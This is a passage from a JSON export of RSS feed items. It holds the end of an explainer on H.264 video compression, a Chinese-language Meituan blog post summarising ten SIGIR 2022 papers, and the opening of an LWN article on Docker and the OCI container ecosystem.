detecting color variations, you can get away with this. By doing this, you reduce total bandwidth by one half, with very little visual difference. Half! Your car now weighs 30 lbs!</p>\n<p>This process of discarding some of the color information is called <strong>Chroma Subsampling</strong>[^4]. While not specific to H.264 and has been around for decades itself, it is used almost universally.</p>\n<p>Those are the big weight shedders for lossy compression. Our frames are now tiny - since we discarded most of the detail information and half of the color information.</p>\n<blockquote>\n<p>Wait. That's it? Can we do something more?</p>\n</blockquote>\n<p>Yes. Weight shedding is only the first step. So far we're only looking at the spatial domains within a single frame. Now it's time to explore temporal compression - where we look at a group of frames across time.</p>\n<h6>Motion compensation</h6>\n<p>H.264 is a motion compensation compression standard.</p>\n<blockquote>\n<p>Motion compensation? What now?</p>\n</blockquote>\n<p>Imagine you're watching a tennis match. The camera is fixed at a certain angle. The only thing moving is the ball back and forth. How would you encode this information? You do what you always do, right? You have a 3D array of pixels, two dimensions in space and one in time. Right?</p>\n<p>Nah. Why would you? Most of the image is the same anyway. The court, the net, the crowds, all are static. The only real action is the ball moving. What if you could just have one static image of everything in the background, and then one moving image of just the ball? Wouldn't that save a lot of space? You see where I am going with this? Get it? See where I am going? Motion estimation?</p>\n<p>Lame jokes aside, this is exactly what H.264 does. H.264 splits up the image into macro-blocks - typically 16x16 pixel blocks that it will use for motion estimation. It encodes one static image - typically called an <strong>I-frame</strong>(Intra frame). This is a full frame - containing all the bits it required to construct that frame. And then subsequent frames are either <strong>P-frames</strong>(predicted) or <strong>B-frames</strong>(bi-directionally predicted). P-frames are frames that will encode a motion vector for each of the macro-blocks from the previous frame. So a P-frame has to be constructed by the decoder based on previous frames. It starts with the last I-frame in the video stream and then walks through every subsequent frame - adding up the motion vector deltas as it goes along until it arrives at the current frame.</p>\n<p>B-frames are even more interesting, where the prediction happens bi-directionally, both from past frames and from future frames. So you can imagine now why that Apple home page video is so well compressed. Because it's really just three I-frames in which the macro blocks are being panned around.</p>\n<p>Let's say you've been playing a video on YouTube. You missed the last few seconds of dialog, so you scrub back a few seconds. Have you noticed that it doesn't instantly start playing from that timecode you just selected. It pauses for a few moments and then plays. It's already buffered those frames from the network, since you just played it, so why that pause?</p>\n<blockquote>\n<p>Yeah that annoys the shit out of me. Why does it do that?</p>\n</blockquote>\n<p>Because you've asked the decoder to jump to some arbitrary frame, the decoder has to redo all the calculations - starting from the nearest I-frames and adding up the motion vector deltas to the frame you're on - and this is computationally expensive, and hence the brief pause. Hopefully you'll be less annoyed now, knowing it's actually doing hard work and not just sitting around just to annoy you.</p>\n<p>Since you're only encoding motion vectors deltas, this technique is extremely space-efficient for any video with motion, at the cost of some computation.</p>\n<p>Now we've covered both spatial and temporal compression! So far we have a shitton of space saved in Quantization. Chroma subsampling further halved the space required. On top of that, we have motion compensation that stores only 3 actual frames for the ~300 that we had in that video.</p>\n<blockquote>\n<p>Looks pretty good to me. Now what?</p>\n</blockquote>\n<p>Now we wrap up and seal the deal. We use a traditional lossless entropy encoder. Because why not? Let's just slap that on there for good measure.</p>\n<h6>Entropy Coder</h6>\n<p>The I-frames, after the lossy steps, contain redundant information. The motion vectors for each of the macro blocks in the P and B-frames - there are entire groups of them with the same values - since several macro blocks move by the same amount when the image pans in our test video.</p>\n<p>An entropy encoder will take care of this redundancy. And since it is a general purpose lossless encoder, we don't have to worry about what tradeoffs it's making. We can recover all the data that goes in.</p>\n<p>And, we're done! At the core of it, this is how video compression codecs like H.264 work. These are its tricks.</p>\n<blockquote>\n<p>Ok great! But I am curious to know how much our car weighs now.</p>\n</blockquote>\n<p>The original video was captured at an odd resolution of 1232x1154. If we apply the math here, we get:</p>\n<p>5 secs @ 60 fps = 1232x1154x60x3x5 =&gt; <strong>1.2 GB</strong><br>\nCompressed video =&gt; <strong>175 KB</strong></p>\n<p>If we apply the same ratio to our 3000 lb car, we get <strong>0.4 lbs</strong> as the final weight. 6.5 ounces!</p>\n<p><strong>Yeah. It's magic!</strong></p>\n<p>Obviously, I am massively oversimplifying several decades of intense research in this field. If you want to know more, the <a href=\"https://en.wikipedia.org/wiki/H.264/MPEG-4_AVC\">Wikipedia Page</a> is pretty descriptive.</p>\n<p>Have comments? Did I get something wrong? Not a fan of the lame jokes? Offended by the swearing? Use <a href=\"https://news.ycombinator.com/item?id=12871403\"><strong>HackerNews</strong></a> or <a href=\"https://www.reddit.com/r/programming/comments/5b31gt/h264_is_magic/\"><strong>Reddit</strong></a> for voicing your opinion!</p>\n<p>Or hit me up on <a href=\"https://twitter.com/SidBaIa\"><strong>Twitter</strong></a> or <a href=\"https://www.linkedin.com/in/sidbalasubramanian\"><strong>LinkedIn</strong></a> if you want to chat.</p>\n<p>[^1]<a href=\"http://www.anandtech.com/show/8747/samsung-ssd-850-evo-review/8\">SSD Benchmarks</a></p>\n<p>[^2]<a href=\"https://en.wikipedia.org/wiki/Nyquist%E2%80%93Shannon_sampling_theorem\">Nyquist-Shannon Sampling Theorem</a></p>\n<p>[^3][Quantization](<a href=\"https://en.wikipedia.org/wiki/Quantization_(signal_processing)\">https://en.wikipedia.org/wiki/Quantization_(signal_processing)</a></p>\n<p>[^4]<a href=\"https://en.wikipedia.org/wiki/Chroma_subsampling\">Chroma Subsampling</a></p>\n"
    },
    "origin": {
        "streamId": 29,
        "title": "Sid Bala",
        "htmlUrl": "https://sidbala.com/",
        "feedUrl": "https://sidbala.com/rss/"
    }
},
{
    "id": "https://tech.meituan.com/2022/07/21/acm-sigir-2022-meituan.html",
    "timestampUsec": "1658742212092893",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "ACM SIGIR 2022 | 美团技术团队精选论文解读",
    "author": ";美团技术团队",
    "published": 1658361600,
    "updated": 1658361600,
    "alternate": [
        {
            "href": "https://tech.meituan.com/2022/07/21/acm-sigir-2022-meituan.html",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<p>SIGIR是信息检索方向的国际顶级会议（CCF-A类）。第 45 届国际信息检索大会（The 45th International ACM SIGIR Conference on Research and Development in Information Retrieval，SIGIR 2022）已于上周（2022年7月11-15日）在西班牙马德里举行，同时也支持线上参会。本次会议共收到 794 篇长文投稿，其中 161 篇长文被录用，录用率约 20%；共收到 667 篇短文投稿，其中 165 篇短文被录用，录用率约 24.7%。</p><p>今年美团技术团队有多篇论文被ACM SIGIR 2022收录，这些论文涵盖了观点标签生成、跨域情感分类、对话摘要领域迁移、跨域检索、点击率预估、对话主题分割等多个技术领域。本文将精选10篇论文做简要的介绍（附下载链接），希望能对从事相关研究的同学有所帮助或启发。</p><p><img src=\"https://p0.meituan.net/travelcube/4e1b90a56cec4593bac9a5119d6d74673825821.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文01：Personalized Abstractive Opinion Tagging</h2><p><strong>|下载地址</strong>：<a href=\"https://dl.acm.org/doi/pdf/10.1145/3477495.3532037\">https://dl.acm.org/doi/pdf</a>（Full Paper）</p><p><strong>| 论文作者</strong>：赵梦雪（美团），杨扬（美团），李淼（美团），王金刚（美团），武威（美团），任鹏杰（山东大学），Maarten de Rijke（阿姆斯特丹大学），任昭春（山东大学）\n<strong>| 论文简介</strong>：观点标签是一组总结用户对产品或服务感受的短文本序列，通常由针对产品特定方面的一组短句组成。相较于推荐理由、方面标签、产品关键词等自然语言文本，观点标签能兼顾信息的完整性和关键信息的顺序性问题。关键词描述了该商户的基本信息，推荐理由可看作该商户下真实用户评论的高度浓缩，而观点标签“肉质很新鲜”则更完整地表达了当前用户对于该商户的“食材新鲜”方面的关键信息。</p><p>现有观点标签的标签顺序，只反映了基于统计信息的大众偏好，忽略了不同用户的个性化偏好。本文提出一种个性化的观点标签生成框架POT。基于产品评论提取产品关键信息，并通过用户评论和用户行为追踪用户的显式和隐式偏好，以确定关键信息的顺序，从而保证产品信息依据用户的感兴趣程度排列。我们设计了一个基于评论的层次异构图联合建模了用户、产品、方面标签和评论中的词，通过节点间深层次的信息交互，挖掘用户和产品之间的潜在关系，缓解了评论的稀疏性问题。同时，我们基于用户对产品的点击、收藏和购买行为构建了多类行为图，通过探索用户之间的相似关系进一步增强用户偏好表示。我们针对评论数据和行为数据的不同特点设计了不同的去噪模块以保证用户偏好表示的准确性。我们构建了基于大众点评真实数据的个性化观点标签数据集PATag，并在生成指标和排序指标中取得了良好的效果。此论文为NLP CIKM 2020论文《<a href=\"https://dl.acm.org/doi/10.1145/3340531.3412740\">Query-aware Tip Generation for Vertical Search</a>》的后续工作。</p><p><img src=\"https://p0.meituan.net/travelcube/4a00ad6b2773938096957308f0a067f2501108.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文02：Graph Adaptive Semantic Transfer for Cross-domain Sentiment Classification</h2><p><strong>| 下载地址</strong>：<a href=\"https://arxiv.org/pdf/2205.08772.pdf\">https://arxiv.org/pdf</a>（Full Paper）</p><p><strong>| 论文作者</strong>：张凯（美团），刘淇（中国科学技术大学），黄振亚（中国科学技术大学），张梦迪（美团），张琨（合肥工业大学），程明月（中国科学技术大学），武威，陈恩红（中国科学技术大学）</p><p><strong>| 论文简介</strong>：跨域情感分类（CDSC）旨在使用从源域中学习到的可迁移语义信息来预测未标记目标域中评论的情感极性。目前针对该任务的研究更多地关注句子层面的序列建模，很大程度上忽略了嵌入在图结构中的丰富的域不变语义信息（即词性标签和依赖关系）。作为探索与理解语言理解特征的一个重要方面，自适应图表示学习近年来发挥了至关重要的作用，尤其是在许多基于图表征模型的传统NLP任务中。例如在细粒度的情感分析（ABSA）任务中，利用图结构中的句法信息来增强Aspect的语义表示已经成为SOTA模型的基本配置。</p><p>在本论文中，我们旨在探索从CDSC中的类图结构中学习不变语义特征的可能性。我们提出了图自适应语义迁移（Graph Adaptive Semantic Transfer, GAST）模型，这是一种自适应句法图嵌入表征方法，能够从单词序列和句法图中学习域不变语义。具体地说，我们首先设计了一个POS-Transformer模块来从单词序列以及词性标签中提取序列化的语义特征；然后，我们设计了一个混合图注意（Hybrid-GAT）模块，通过考虑可迁移、域共享的图依赖关系来生成基于句法的通用语义特征；最后，我们设计了一个集成的自适应优化策略（Integrated aDaptive Strategy, IDS）来指导两个模块的联合学习过程。在四个公共数据集上进行的广泛实验证明，GAST的有效性优于一系列最先进的模型。</p><p><img src=\"https://p1.meituan.net/travelcube/27d25bcd158ab86e8cd450bfbad00e54445427.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文03：ADPL: Adversarial Prompt-based Domain Adaptation for Dialogue Summarization with Knowledge Disentanglement</h2><p><strong>| 下载地址</strong>：<a href=\"https://dl.acm.org/doi/pdf/10.1145/3477495.3531933\">https://dl.acm.org/doi/pdf</a>（Full Paper）</p><p><strong>| 论文作者</strong>：赵璐璐（北京邮电大学），郑馥嘉（北京邮电大学），曾伟豪（北京邮电大学），何可清，耿若彤（北京邮电大学），江会星（美团），武威（美团），徐蔚然（北京邮电大学）</p><p><strong>| 论文简介</strong>：领域自适应是机器学习中的一个基本任务。在本文中，我们研究对话摘要任务中的领域迁移问题，试图借助源域的有标注数据迁移到无标注或少标注的目标域，进而提升低资源目标域下对话摘要的生成效果，可用于解决实际场景中小业务数据匮乏的挑战。传统的对话摘要领域迁移方法往往依赖于大规模领域语料，借助于预训练来学习领域间知识。该方法的缺点是实际语料收集难，对算力要求高，针对每一个目标域都需要进行耗时的预训练过程，效率低。</p><p>本文从微调的角度出发，提出了一种轻量级的解耦知识迁移方法ADPL，无需大规模的预训练过程，仅仅利用源域数据和少量的无标注目标域数据，即可实现高质量的对话摘要生成。具体来说，我们基于Prompt Learning的思想，针对对话摘要任务中的领域迁移问题，提出了三种特定的prompt结构：Domain-Invariant Prompt (DIP)、Domain-Specific Prompt (DSP)和Task-Oriented Prompt (TOP)，其中DIP用来捕获领域间的共享特征，DSP用来建模领域特有知识，TOP用来促进生成流畅的摘要。在训练中，我们仅仅更新这些Prompt相关的参数就可以实现领域间知识的解耦和迁移，相比较之前的预训练方法，训练高效环保，对机器的显存要求显著降低。同时，我们基于两个大规模的对话摘要数据集QMSum和TODSum构建了对话摘要领域迁移评测集，在两个评测集上取得了一致的最优效果，实验结果和消融分析都证明了本文提出方法的有效性。</p><p><img src=\"https://p0.meituan.net/travelcube/d2f06a14f24824f0f42d51eb3da68799144346.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文04：Structure-Aware Semantic-Aligned Network for Universal Cross-Domain Retrieval</h2><p><strong>| 下载地址</strong>：<a href=\"https://dl.acm.org/doi/pdf/10.1145/3477495.3532061\">https://dl.acm.org/doi/pdf</a>（Full Paper）</p><p><strong>| 论文作者</strong>：田加林（美团）， 徐行（电子科技大学），王凯（电子科技大学），曹佐（美团），蔡勋梁（美团），申恒涛（电子科技大学）</p><p><strong>| 论文简介</strong>：跨域检索（Cross-Domain Retrieval，CDR）旨在实现基于内容的多域图像表征对齐和检索；当域间差异过大时，也称之为跨模态检索。传统的CDR方法只考虑训练和测试数据来源于相同的域和相同类。然而，实际应用场景中测试样本常来自于未见类，或者未见域，又或者两者皆是。卷积神经网络已经成为CDR任务主流，然而，由于卷积操作的内在局部性，CNN在对物体的全局结构信息进行建模时受到明显的制约。</p><p>基于上述问题，我们提出通用跨域检索（Universal Cross-Domain Retrieval, UCDR），其测试数据可以来源于未见类、未见域或者两者结合，方法中我们使用基于Vision Transformer（ViT）的结构感知语义对齐网络，利用ViT的能力来建模物体的全局结构信息。具体而言，我们将自监督预训练的ViT模型和微调模型整合到一个框架下，通过对齐软标签防止微调模型遗忘全局结构信息，提升微调模型泛化性；通过可学习的类原型在超球空间对齐多域表征，提升微调模型的判别性。实验结果表明，我们的方法在跨域检索任务上远超现有算法，成功实现跨域表征对齐和模型泛化性。</p><p><img src=\"https://p1.meituan.net/travelcube/f17ed30e7abcd1479ab2669dfeabd05c589112.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文05：Multimodal Disentanglement Variational Autoencoders for Zero-Shot Cross-Modal Retrieval（Full Paper）</h2><p><strong>| 下载地址</strong>：<a href=\"https://dl.acm.org/doi/pdf/10.1145/3477495.3532028\">https://dl.acm.org/doi/pdf</a></p><p><strong>| 论文作者</strong>：田加林（美团），王凯（电子科技大学），徐行（电子科技大学），曹佐（美团），沈复民（电子科技大学），申恒涛（电子科技大学）</p><p><strong>| 论文简介</strong>：测试集由未见类组成是零样本跨模态检索（Zero-Shot Cross-Modal Retrieval，ZS-CMR）关注的一个实际的检索场景。现有方法通常采用生成模型作为主要框架，学习联合潜在嵌入空间表征以缓解模态差异。一般来说，这些方法主要依靠额外的语义嵌入实现跨类的知识迁移，并且不自觉地忽略了生成模型中数据重建方式的影响。</p><p>基于上述问题，我们提出一个称为多模态解耦变分自编码器（MDVAE）的ZS-CMR模型，它由两个特定于模态的解耦变分自编码器（DVAE）和一个融合交换自动编码器（FVAE）组成。具体来说，DVAE把每种模态的原始表征分解为模态不变特征和特定于模态的特征。FVAE通过重构和对齐过程来融合和交换多模态数据的信息，而无需额外的语义嵌入。此外，我们还提出了一个新颖的反直觉交叉重构方案，以提高模态不变量特征的信息量和通用性，从而实现更有效的知识迁移。提出的方法在图像-文本和图像-草图检索任务中取得明显性能提升，建立了新的SOTA结果。</p><p><img src=\"https://p1.meituan.net/travelcube/3648ae5c5fb6cdbe01d639a42a860b8b484787.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文06：Co-clustering Interactions via Attentive Hypergraph Neural Network</h2><p><strong>| 下载地址</strong>：<a href=\"https://dl.acm.org/doi/pdf/10.1145/3477495.3531868\">https://dl.acm.org/doi/pdf</a>（Full Paper）</p><p><strong>| 论文作者</strong>：杨天持（北京邮电大学），杨成（北京邮电大学），张路浩（美团），石川（北京邮电大学），胡懋地（美团），刘怀军（美团），李滔（美团），王栋（美团）</p><p><strong>| 论文简介</strong>：随着如电商平台中的用户-商家/商品的点击或者购买等交互数据的快速增多，人们提出了许多聚类方法用于发现交互模式，例如在外卖场景中的“白领经常在下午购买咖啡以提升工作效率”，从而作为先验知识来帮助下游任务。考虑到交互可以被视为多个对象之间发生的一个动作，大多数现有方法将对象及其成对关系建模为图中的节点和边。然而，他们只对实际的完整交互中的部分信息进行了建模和利用，即要么将一个完整交互分解成若干个成对的子交互以进行简化，要么只专注于对某些特定类型的对象进行聚类，这限制了聚类的性能和解释性。</p><p>在本文中，针对这一问题，我们提出通过注意力超图神经网络对交互进行协同聚类（CIAH）。具体来说，在通过超图对交互进行更全面的建模（包括用户属性、商家属性、菜品属性、时空属性等）后，我们提出一个注意力超图神经网络来编码完整交互，其中使用注意机制来选择重要的属性以作为聚类结果的解释。然后，我们引入了一种显著性方法来指导注意力机制的学习，以使其与属性的真实重要性更加一致，称为基于显著性的一致性。此外，我们还提出了一种新颖的协同聚类方法来对交互的表示和相应的属性选择分布进行协同聚类，称为基于聚类的一致性。实验表明CIAH在公开数据集和美团数据集上均显著优于最先进的聚类方法。</p><p><img src=\"https://p0.meituan.net/travelcube/64f0d51b1f4a89951906e82322b53bed334880.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文07：DisenCTR: Dynamic Graph-based Disentangled Representation for Click-Through Rate Prediction</h2><p><strong>| 下载地址</strong>：<a href=\"https://dl.acm.org/doi/pdf/10.1145/3477495.3531851\">https://dl.acm.org/doi/pdf</a>（Short Paper）</p><p><strong>| 论文作者</strong>：王一帆（北京大学），覃义方（美团），孙昉（美团），张博（美团），侯旭阳（美团），胡可（美团），程佳（美团），雷军（美团），张铭（北京大学）</p><p><strong>| 论文简介</strong>：点击率（CTR）预估在推荐系统、搜索广告等下游业务中有着重要的应用。现有工作常常通过用户行为序列刻画用户兴趣，却未能捕捉用户实时兴趣的多样性（Diversity）和流动性（Fluidity）。为了更加准确地刻画用户实时兴趣，提升CTR预估质量，该论文提出了基于动态图的解耦合表示框架DisenCTR，对用户不断变化的多兴趣进行建模。DisenCTR在动态时序U-I子图上通过动态路由机制提取用户多兴趣的解耦合表示（Disentangled Representation），并使用混合霍克斯过程（Mixture of Hawkes Process）模拟用户历史行为中的自激效应。该模型在公开数据集和美团私有数据集上均取得了显著的性能提升。</p><p><img src=\"https://p0.meituan.net/travelcube/5888994701ded7adbe8409f691418423141712.jpg\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文08：Hybrid CNN Based Attention with Category Prior for User Image Behavior Modeling</h2><p><strong>| 下载地址</strong>：<a href=\"https://arxiv.org/pdf/2205.02711.pdf\">https://arxiv.org/pdf</a>（Short Paper）</p><p><strong>| 论文作者</strong>：陈鑫（美团），唐庆涛（美团），胡可（美团），徐越（美团），邱世航（香港科技大学），程佳（美团），雷军（美团）</p><p><strong>| 论文简介</strong>：在推荐广告场景中，每个POI会展示其对应的图片，展示的图片通常会影响用户是否点击这个POI，这意味着建模用户对图片的偏好有助于CTR建模。业界对图片建模大多数停留在POI侧，较少关注用户侧图片行为序列的建模。目前现有的用户创意图片行为序列模型通常使用Two-Stage的模型结构，即在第一阶段通过现成的CNN网络提取创意图片的Embedding，第二阶段使用图片Embedding和CTR模型联合训练，这种两阶段架构对于CTR建模是次优的，除此之外现有的CNN缺乏场景属性相关的类别先验，会导致CNN提取场景任务无关的特征，从而限制了CNN的表达能力。</p><p>为此，在本文中我们设计了一种Fixed-CNN和Trainable-CNN混合的Hybrid CNN结构(HCCM)，来建模用户图像行为序列。文章主要贡献：1）通过ImageNet预训练的参数初始化浅层CNN，固定浅层CNN参数的同时将深层CNN与CTR模型联合训练。2）设计了将候选图片和用户对图片的偏好相结合的图片语意Attention机制，为提升CNN在推荐广告CTR任务上的特征提取能力，HCCM将图片和图片的类别先验在Feature Map维度通过Channel Attention的方式提取类目体系相关特征。相关技术方案在到店推荐广告的所有场景（包括首页信息流推荐、商户详情页推荐和团单详情页推荐等）均取得了显著效果。</p><p><img src=\"https://p1.meituan.net/travelcube/d5d33e9fdd6dea5d50866dec184a4df9268466.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文09：Dialogue Topic Segmentation via Parallel Extraction Network with Neighbor Smoothing</h2><p><strong>| 下载地址</strong>：<a href=\"https://dl.acm.org/doi/pdf/10.1145/3477495.3531817\">https://dl.acm.org/doi/pdf</a>（Short Paper）</p><p><strong>| 论文作者</strong>：夏今雄（美团），刘操（美团），陈见耸（美团），李宇琛（美团），杨帆（美团），蔡勋梁（美团），万广鲁（美团），王厚峰（北京大学）</p><p><strong>| 论文简介</strong>：对话主题分割需要将对话分割成具有预定义主题的片段。现有的主题切分研究采用两阶段范式，包括文本切分和片段标注。然而，这些方法在分割时往往侧重于局部上下文，并且没有很好地捕捉到片段间的依赖关系。此外，对话段边界的模糊性和标签噪声对现有模型提出了进一步的挑战。</p><p>为此，我们提出了基于邻域平滑的并行抽取网络 (PEN-NS) 来解决上述问题。具体来说，我们提出了并行抽取网络来执行片段提取，优化片段的二分匹配代价以捕获片段间的依赖关系。此外，我们还提出了邻域平滑来处理数据噪声和边界模糊。在基于对话和基于文档的主题分割数据集上的实验表明，PEN-NS的性能显著优于现有的模型。</p><p><img src=\"https://p0.meituan.net/travelcube/91b6fadacc06f73b8c8c33345ae37b68680442.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><h2>论文10：Deep Page-Level Interest Network in Reinforcement Learning for Ads Allocation</h2><p><strong>| 下载地址</strong>：<a href=\"https://dl.acm.org/doi/pdf/10.1145/3477495.3531847\">https://dl.acm.org/doi/pdf</a>（Short Paper）</p><p><strong>| 论文作者</strong>：廖国钢（美团），石晓文（美团），王泽（美团），吴晓旭（美团），张楚珩（美团实习生），王永康（美团），王兴星（美团），王栋（美团）</p><p><strong>| 论文简介</strong>：在Feed流场景下，用户在页面的行为模式受页面展示多个物品影响，单点兴趣无法建模页面内多物品的竞争关系，难以利用更丰富的请求级用户行为信息（如下刷，流失等），无法充分提取用户复杂的页面级决策模式。因此，如何利用用户的请求级行为信息，建模列表物品的竞争关系和相互影响，在重排、混排、预估等场景均有极大业务价值，是一个非常有意义也极具挑战性的问题。业界主流用户兴趣建模框架侧重通过单物品行为序列来刻画用户的兴趣，主要有三方面局限性：一是单物品序列忽略了列表中物品竞争关系；二是点击下单等单物品行为忽略了用户的页面级行为信息，对于用户行为刻画不完整；三是忽略用户感受野差异，不同用户对页面中不同区域物品的关注度有较大差异。</p><p><img src=\"https://p0.meituan.net/travelcube/785214e08d92fe5ed24d45de9035f168253193.png\" alt=\"\" referrerpolicy=\"no-referrer\"></p><p>针对以上挑战，本文设计了基于强化学习框架的页面级深度兴趣网络框架（DPIN），利用用户的列表粒度行为信息，刻画列表广告与广告、广告与自然结果的竞争关系和相互影响，建模用户在浏览页面时复杂的决策行为模式。具体有四方面：一是基于用户历史行为构造Page-Level序列，设计页面内自注意力层对页面内竞争关系进行建模；二是在点击下单行为的基础上，增加下刷、流失屏等页面级负反馈、隐式反馈信息，并对隐式反馈信息去噪；三是设计不同卷积核对页面的局部视野信息进行抽取，得到多个通道的Page-Level信息，建模考虑用户感受野差异；四是设计Page-Level行为匹配层，对不同通道的用户历史行为序列和当前候选序列进行整体匹配建模，提升广告分配决策效率。本文的技术方案在美团外卖场景取得了显著效果，并完成线上大规模落地。此论文为WWW 2022论文《Cross DQN: Cross Deep Q Network for Ads Allocation in Feed》的后续工作。</p><h2>写在后面</h2><p>以上这些论文是美团技术团队与各高校、科研机构通力合作的成果。本文主要介绍了我们在观点标签、跨域情感分类、领域自适应、跨域检索、点击率预估、对话主题分割等技术领域做的一些科研工作。希望能对大家有所帮助或启发，也欢迎大家跟我们进行交流。</p><h2>美团科研合作</h2><p>美团科研合作致力于搭建美团技术团队与高校、科研机构、智库的合作桥梁和平台，依托美团丰富的业务场景、数据资源和真实的产业问题，开放创新，汇聚向上的力量，围绕机器人、人工智能、大数据、物联网、无人驾驶、运筹优化等领域，共同探索前沿科技和产业焦点宏观问题，促进产学研合作交流和成果转化，推动优秀人才培养。面向未来，我们期待能与更多高校和科研院所的老师和同学们进行合作。欢迎老师和同学们发送邮件至：meituan.oi@meituan.com。</p>"
    },
    "origin": {
        "streamId": 13,
        "title": "美团技术团队",
        "htmlUrl": "https://tech.meituan.com/feed/",
        "feedUrl": "https://rsshub.black-desk.cn/meituan/tech/home"
    }
},
{
    "id": "902049",
    "timestampUsec": "1658855585919014",
    "categories": [
        "user/-/state/com.google/read",
        "user/-/state/com.google/starred"
    ],
    "title": "Docker and the OCI container ecosystem",
    "author": ";jake",
    "published": 1658854920,
    "updated": 1658854920,
    "alternate": [
        {
            "href": "https://lwn.net/Articles/902049/",
            "type": "text/html"
        }
    ],
    "content": {
        "content": "<div>\n           <p>July 26, 2022</p>\n           <p>This article was contributed by Jordan Webb</p>\n           </div>\n<p><a href=\"https://www.docker.com/\">Docker</a> has transformed the way\nmany people develop and deploy software.  It wasn't the first\nimplementation of containers on Linux, but Docker's ideas about how\ncontainers should be structured and managed were different from its\npredecessors.  Those ideas matured into industry standards, and an\necosystem of software has grown around them.  Docker continues to be a\nmajor player in the ecosystem, but it is no longer the only whale in the\nsea — Red Hat has also done a lot of work on\ncontainer tools, and alternative implementations are\nnow available for many of Docker's offerings.  </p>\n\n<h4>Anatomy of a container</h4>\n\n<p>A container is somewhat like a lightweight virtual machine; it shares a\nkernel with the host, but in most other ways it appears to be an\nindependent machine to the software running inside of it.  The Linux kernel\nitself has no concept of containers; instead, they are created by using\na combination of several kernel features: </p>\n\n<ul>\n\n<li> <a href=\"https://docs.docker.com/storage/bind-mounts/\">Bind mounts</a> and <a href=\"https://www.kernel.org/doc/html/latest/filesystems/overlayfs.html\">overlayfs</a>\nmay be used to \nconstruct the root filesystem of the container.</li>\n\n<li> <a href=\"https://man7.org/linux/man-pages/man7/cgroups.7.html\">Control\ngroups</a> may be used to partition CPU, memory, and I/O resources for  the\nhost kernel.</li> \n\n<li> <a href=\"https://lwn.net/Articles/531114/\">Namespaces</a> are used to\ncreate an isolated view of the system for processes running inside the\ncontainer.</li>\n\n</ul>\n\n<p>Linux's namespaces are the key feature that allow the creation of\ncontainers.  Linux supports namespaces for multiple different aspects of\nthe system, including user namespaces for separate views of user and group\nIDs, PID namespaces for distinct sets of process IDs, network namespaces\nfor distinct sets of network interfaces, and several others.  When a\ncontainer is started, a runtime creates the appropriate control groups,\nnamespaces, and filesystem mounts for the container; then it launches a\nprocess inside the environment it has created.  </p>\n\n<p>There is some level of disagreement about what that process should be.\nSome prefer to start an init process like systemd and run a full Linux system inside\nthe container.  This is referred to as a \"system container\";  it was the\nmost common type of container before Docker. System containers\ncontinue to be supported by software like <a href=\"https://linuxcontainers.org/lxc/introduction/\">LXC</a> and <a href=\"https://openvz.org/\">OpenVZ</a>.  </p>\n\n<p>Docker's developers had a different idea.  Instead of running an entire\nsystem inside a container, Docker says that each\ncontainer <a href=\"https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#decouple-applications\">should only run a single application</a>.  This style of\ncontainer is known as an \"application container.\"  An application container\nis started using a container image, which bundles the application together\nwith its dependencies and just enough of a Linux root filesystem to run it.\n</p>\n\n<p>\nA container image generally does not include an init system, and may not\neven include a package manager — container images are usually replaced with\nupdated versions rather than updated in place.  An image for\na statically-compiled application may be as <a href=\"https://github.com/GoogleContainerTools/distroless\">minimal</a> as a single binary\nand a handful of support files in <tt>/etc</tt>.  \nApplication\ncontainers usually don't have a persistent root filesystem; instead,\noverlayfs is used to create a temporary layer on top of the container\nimage.  This is thrown away when the container is stopped.  Any persistent\ndata outside of the container image is grafted on to the container's\nfilesystem via a bind mount to another location on the host.  </p>\n\n<h4>The OCI ecosystem</h4>\n\n<p>These days, when people talk about containers, they are likely to be\ntalking about the style of application containers popularized by Docker.\nIn fact, unless otherwise specified, they are probably talking about the\nspecific container image format, run-time environment, and registry API\nimplemented by Docker's software. Those have all been standardized by the <a href=\"https://opencontainers.org/\">Open Container Initiative</a> (OCI), which\nis an industry body that was formed in 2015 by Docker\nand the Linux\nFoundation.  Docker refactored its\nsoftware into a number of smaller components; some of those components,\nalong with their specifications, were placed\nunder the care of the OCI.  The software and specifications published by\nthe OCI formed the seed for what is now a robust ecosystem of\ncontainer-related software.  </p>\n\n<p>The <a href=\"https://github.com/opencontainers/image-spec/blob/main/spec.md\">OCI\nimage specification</a> defines a format for container images that\nconsists of a JSON configuration (containing environment variables, the\npath to execute, and so on) and a series of tarballs called \"layers\".  The\ncontents of each layer are stacked on top of each other,\nin series, to construct the root filesystem for the container\nimage.  Layers can be shared between images; if a server is running several\ncontainers that refer to the same layer, they can potentially share the\nsame copy of that layer.  Docker provides minimal images for several\npopular Linux distributions that can be used as the base layer for\napplication containers.  </p>\n\n<p>The OCI also publishes a <a href=\"https://github.com/opencontainers/distribution-spec/blob/main/spec.md\">distribution\nspecification</a>.  In this context, \"distribution\" does not refer to a\nLinux distribution; it is used a more general sense.  This specification\ndefines an HTTP API for pushing and pulling container images to and from a\nserver; servers that implement this API are called container registries.\nDocker maintains a large public registry called <a href=\"https://hub.docker.com/\">Docker Hub</a> as well as a <a href=\"https://github.com/distribution/distribution\">reference\nimplementation</a> (called \"Distribution\", perhaps confusingly) that can be self-hosted.\nOther implementations of the specification include Red Hat's <a href=\"https://quay.io/\">Quay</a> \nand VMware's  <a href=\"https://goharbor.io/\">Harbor</a>, as well as hosted\nofferings from <a href=\"https://aws.amazon.com/ecr/\">Amazon</a>, <a href=\"https://docs.github.com/en/packages/working-with-a-github-packages-registry/working-with-the-container-registry\">GitHub</a>,\n<a href=\"https://docs.gitlab.com/ee/user/packages/container_registry/\">GitLab</a>, \nand <a href=\"https://cloud.google.com/container-registry/\">Google</a>.\n</p>\n\n<p>A program that implements the <a href=\"https://github.com/opencontainers/runtime-spec/blob/main/spec.md\">OCI\nruntime specification</a> is responsible for everything pertaining to\nactually running a container.  It sets up any 